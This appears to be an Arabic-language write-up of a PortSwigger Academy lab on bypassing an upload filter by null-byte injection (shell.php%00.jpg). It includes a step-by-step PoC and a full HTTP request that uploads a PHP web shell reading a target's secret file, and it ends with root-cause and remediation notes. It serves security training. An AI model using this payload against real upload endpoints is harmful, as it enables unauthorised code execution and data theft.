# Lab 05 — Web Shell Upload via Obfuscated File Extension (حقن البايت الفارغ لكسر الامتداد)

[![التصنيف](https://img.shields.io/badge/الفئة-File%20Upload-indigo)]()
[![النوع](https://img.shields.io/badge/النوع-File%20Upload%20—%20Null%20Byte%20Injection-orange)]()
[![مستوى الخطورة](https://img.shields.io/badge/الخطورة-حرج%20(Critical)-critical)]()
[![المصدر](https://img.shields.io/badge/المصدر-PortSwigger%20Academy-blue)](https://portswigger.net/web-security/file-upload)

> هذا الشرح جزء من سلسلة [معامل ثغرات رفع الملفات (File Upload)](./README.md) — أكاديمية PortSwigger.

---

## 1. بطاقة تعريف اللاب (Overview)

| الحقل | التفاصيل |
|---|---|
| **اسم اللاب** | Lab 05 — Web Shell Upload via Obfuscated File Extension (حقن البايت الفارغ لكسر الامتداد) |
| **تصنيف الثغرة** | File Upload — Null Byte Injection |
| **معيار الضعف (CWE)** | CWE-434 / CWE-626: Null Byte Interaction Error |
| **مستوى الخطورة** | حرج (Critical) |
| **الهدف من اللاب** | رفع ويب شل بحقن بايت فارغ %00 لكسر الامتداد وقراءة سر carlos. |

---

## 2. فكرة اللاب وسيناريو المشكلة (Concept & Vulnerability Mechanism)

يشترط فلتر الرفع في هذا اللاب أن ينتهي اسم الملف بامتداد صورة معتمد (`.jpg` أو `.png`).

**الخلل الفكري هنا:**
نستغل عدم التطابق التاريخي في لغة C:
إذا قمنا برفع ملف باسم: `shell.php%00.jpg`:
1. عند الفحص في كود لغة الويب: ينتهي الاسم بـ `.jpg` فيمر من الفلتر بنجاح.
2. عند الحفظ على القرص الصلب: تقوم دوال نظام التشغيل المكتوبة بـ C بقراءة الاسم حتى تصل للبايت الصفري `%00` فتعتبره نهاية السلسلة وتقتطع كل ما بعده، فيتم حفظ الملف على القرص باسم: `shell.php` الحقيقي! وعند طلبه يعمل كويب شل كامل!

---

## 3. التحليل الجذري للسبب (Root Cause Analysis)

### 🔴 وجهة نظر المهاجم (Attacker Perspective):
المهاجم يدمج امتداد صورة صالح مع بايت فارغ `%00` ليرضي الفلتر ويجبر النظام على حفظ الملف بامتداد الـ PHP فقط.

### 🟢 وجهة نظر المدافع والمطور (Defender Perspective):
عدم تطهير اسم الملف من الحروف الخاصة والبايتات الصفرية قبل الحفظ على القرص.

---

## 4. خطوات الاستغلال والحل بالتفصيل (Proof of Concept - PoC)

1. سجل دخولك وافتح طلب الرفع في Burp Suite Repeater.
2. في سطر `Content-Disposition`، اكتب اسم الملف مع حقن الـ Null Byte المشفر:
`filename="shell.php%00.jpg"`.
3. تأكد من ضبط `Content-Type: image/jpeg` وكود الشل في المحتوى:
`<?php echo file_get_contents('/home/carlos/secret'); ?>`.
4. أرسل الطلب، ستلاحظ أن السيرفر قبل الملف ورفعه بنجاح!
5. الآن افتح مسار الملف في المتصفح ولكن بالاسم المقتطع فقط:
`/files/avatars/shell.php`.
6. سيعمل الويب شل فوراً ويظهر لك السر المطلوب لحل اللاب.

---

## 5. أدلة الترافيك (Evidence: Request / Response)

### نموذج طلب الاستغلال (Exploit Request):
```http
POST /my-account/avatar HTTP/1.1
Host: <lab-id>.web-security-academy.net
Content-Type: multipart/form-data; boundary=----

------
Content-Disposition: form-data; name="avatar"; filename="shell.php%00.jpg"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
------
```

### نموذج استجابة السيرفر (Server Response):
```http
HTTP/1.1 200 OK

The file avatars/shell.php has been uploaded.
```

---

## 6. الأثر الواقعي للثغرة (Impact)

تجاوز فلاتر التحقق من الامتدادات الصارمة وتنفيذ كود عشوائي على السيرفر.

---

## 7. الحماية والإغلاق البرمجي (Remediation)

استخدام إصدارات حديثة من لغات البرمجة (تم إصلاح هذا السلوك في PHP 5.3.4+)، وتوليد أسماء ملفات جديدة كلياً في الباك إند.

---

## 8. المراجع الرسمية (References)

- [PortSwigger Web Security Academy — File Upload](https://portswigger.net/web-security/file-upload)
- [OWASP Top 10 — Vulnerabilities](https://owasp.org/)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)

---
*تم إعداد هذا التوثيق للأغراض التعليمية واختبار الاختراق الأخلاقي المصرح به.*
